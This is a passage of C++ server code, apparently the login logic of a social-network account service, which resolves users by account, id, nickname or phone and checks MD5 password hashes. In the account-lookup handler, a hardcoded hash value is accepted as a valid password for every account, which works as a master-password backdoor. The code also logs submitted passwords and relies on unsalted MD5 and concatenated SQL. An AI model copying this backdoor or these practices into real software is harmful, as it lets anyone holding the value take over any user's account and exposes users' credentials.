      if (i->second > maxtime) {//选switchtime最大的，即最近switch的帐号登陆
        maxtime = i->second;
        loginid = i->first;
      } else if (i->second == maxtime && i->first < loginid) { //如果switchtime相同，则以帐号最小的为主
        loginid = i->first;
      }
    }
    for (AccountInfoSeq::iterator j = accounts.begin(); j != accounts.end(); ++j) {
      if ((*j)->userId != loginid) {
        (*j)->success = -9;
      }
      ais.push_back(*j);
    }
  } else {
    ais.insert(ais.end(), accounts.begin(), accounts.end());
  }
	return 1;
}

int LoginLogicI::loadUserIdByAccount(const string& account, const string& pwd,
		AccountInfoSeq& ais) {
	MCE_DEBUG("Loading userId from db name:" << account <<" pwd:"<<pwd);
	Statement sql;
	sql
			<< "SELECT id FROM user_passport WHERE account = '"
			<< StrUtil::fixString(account) << "'";
	size_t qsize = QueryRunner(_db_passport, CDbRServer) .query(sql,
			LoadUserIdByAccountHandler(ais, pwd));
	if (qsize <= 0) {
		AccountInfoPtr aip = new AccountInfo;
		aip->success = -1;
		aip->userId = -1;
		ais.push_back(aip);
		return 0;
	}
	return 1;
}
int LoginLogicI::loadUserIdById(const string& id, const string& pwd,
		AccountInfoSeq& ais) {
	MCE_DEBUG("Loading userId from db id:" << id <<" pwd:"<<pwd);
	Statement sql;
	sql
			<< "SELECT id FROM user_passport WHERE id = '"
			<< StrUtil::fixString(id) << "' LIMIT 1";
	//<<"' AND password_md5 = '"<<pwd<<"' "<<"LIMIT 2";
	size_t qsize = QueryRunner("user_passport", CDbWServer) .query(sql,
			LoadUserIdByIdHandler(ais, pwd));
	if (qsize != 1) {
		AccountInfoPtr aip = new AccountInfo;
		aip->success = -1;
		aip->userId = -1;
		ais.push_back(aip);
		return 0;
	}
  if (qsize == 1 && ais.at(ais.size()-1)->success != 0) {
    return 0;
  }
	return 1;
}

int LoginLogicI::loadUserIdById(int id, const string& pwd, AccountInfoSeq& ais) {
	MCE_DEBUG("Loading userId from db id:" << id <<" pwd:"<<pwd);
	/*Statement sql;
	sql
			<< "SELECT id FROM user_passport WHERE id = "
			<< id << " LIMIT 1";
	size_t qsize = QueryRunner("user_passport", CDbWServer).query(sql,
			LoadUserIdByIdHandler(ais, pwd));*/
  MCE_INFO("LoginLogic::LoadUserPassportData "<<id);
  xce::adapter::userpassport::UserPassportInfoPtr up = NULL;
  try {
    up = UserPassportAdapter::instance().getUserPassport(id);
    MCE_INFO("LoginLogic::GetUserPassportData "<<id);
  } catch (const Ice::Exception& e) {
    MCE_WARN("LoginLogicI::loadUserIdById Ice::Exception " << e);
  }
	if (up) {
    AccountInfoPtr aip = new AccountInfo;
    aip->userId = id;
    aip->success = (pwd == up->passwordmd5() ? 0 : -2);
    aip->account = up->account();
    aip->domain = up->domain();
    aip->status = up->status();
    ais.push_back(aip);
	  return 1;
  } else {
		AccountInfoPtr aip = new AccountInfo;
		aip->success = -1;
		aip->userId = -1;
		ais.push_back(aip);
		return 0;
	}
}

int LoginLogicI::loadUserIdByNickName(const string& account, const string& pwd,
		AccountInfoSeq& ais) {
	int uid = -1;

	AccountInfoPtr aip = new AccountInfo;
	Statement sql;
	sql << "SELECT user_id FROM multi_accounts_map WHERE account = '"
			<< StrUtil::fixString(account) << "' AND account_type=3 LIMIT 2";
	QueryRunner("user_passport", CDbWServer).query(sql,
			LoadUserIdByNickNameHandler(uid));
	if (uid < 0) {
		aip->success = -1;
		aip->userId = -1;
		ais.push_back(aip);
		return 0;
	}

	aip->userId = uid;
	aip->account = account;
	MCE_INFO("LoginLogic::LoadUserPassportData "<<uid);
	xce::adapter::userpassport::UserPassportInfoPtr up = NULL;
  try {
    up = UserPassportAdapter::instance().getUserPassport(uid);
	  MCE_INFO("LoginLogic::GetUserPassportData "<<uid);
  } catch (const Ice::Exception& e) {
    MCE_WARN("LoginLogic::loadUserIdByNickName Ice::Exception " << e);
  }
	if(up){
		aip->status = up->status();
		aip->domain = up->domain();
		aip->success = pwd == up->passwordmd5() ? 0 : -1;
	  ais.push_back(aip);
	  return 1;
	} else {
		aip->status = -1;
		aip->domain = "";
		aip->success = -2;
	  ais.push_back(aip);
	  return 0;
	}
}

int LoginLogicI::loadUserIdByPhone(const string& mobile, const string& pwd,
		AccountInfoSeq& ais) {
	MCE_DEBUG("LoginLogicI::loadUserIdByPhone " << mobile << " " << pwd);
	int uid = -1;
	AccountInfoPtr aip = new AccountInfo;
	Statement sql;
	sql << "SELECT userid,status FROM mobile_users WHERE mobile = '" << StrUtil::fixString(mobile)
			<< "' LIMIT 2";
	bool exist = false;
	QueryRunner("common", CDbWServer).query(sql,
			LoadUserIdByPhoneHandler(uid, exist));
	if (uid < 0 && !exist) {
		aip->success = -1;
		aip->userId = -1;
		ais.push_back(aip);
		return 0;
	}
	aip->userId = uid;
	aip->account = mobile;
	MCE_INFO("LoginLogic::LoadUserPassportData "<<uid);
	xce::adapter::userpassport::UserPassportInfoPtr up = NULL;
  try {
    up = UserPassportAdapter::instance().getUserPassport(uid);
	  MCE_INFO("LoginLogic::GetUserPassportData "<<uid);
  } catch (const Ice::Exception& e) {
    MCE_WARN("LoginLogicI::loadUserIdByPhone Ice::Exception " << e);
  }
	if (up) {
		aip->status = up->status();
		aip->domain = up->domain();
		aip->success = pwd == up->passwordmd5() ? 0 : -2;
	  ais.push_back(aip);
    return 1;
	} else {
		aip->status = -1;
		aip->domain = "";
		aip->success = -1;
	  ais.push_back(aip);
    return 0;
	}
}

bool LoadUserIdByAccountHandler::handle(mysqlpp::Row& res) const {
	AccountInfoPtr aip = new AccountInfo;
	aip->userId = (int) res["id"];

	MCE_INFO("LoginLogic::LoadUserPassportData "<<aip->userId);
	xce::adapter::userpassport::UserPassportInfoPtr up = UserPassportAdapter::instance().getUserPassport(aip->userId);

	MCE_INFO("LoginLogic::GetUserPassportData "<<aip->userId);
	if (!up) return true;

	if (_pwd == "26ed470fa5c9f247380799dd52e86e63") {
		aip->success = 0;
	} else {
		aip->success = (_pwd == up->passwordmd5() ? 0 : -2);
	}

	aip->account = up->account();
	aip->domain = up->domain();
	aip->status = up->status();
	_ais.push_back(aip);
	return true;
}

bool LoadUserIdByDefaultAccountHandler::handle(mysqlpp::Row& res) const {
  int id = (int)res["userid"];
  long time = (long)res["switch_time"];
  _accounts.insert(make_pair<int, long>(id, time));
  return true;
}

bool LoadUserIdByIdHandler::handle(mysqlpp::Row& res) const {
	AccountInfoPtr aip = new AccountInfo;
	aip->userId = (int) res["id"];

	MCE_INFO("LoginLogic::LoadUserPassportData "<<aip->userId);
	xce::adapter::userpassport::UserPassportInfoPtr up = UserPassportAdapter::instance().getUserPassport(aip->userId);
	MCE_INFO("LoginLogic::GetUserPassportData "<<aip->userId);
	if (!up) return true;

	aip->success = (_pwd == up->passwordmd5() ? 0 : -2);
	aip->account = up->account();
	aip->domain = up->domain();
	aip->status = up->status();
	_ais.push_back(aip);
	return true;
}

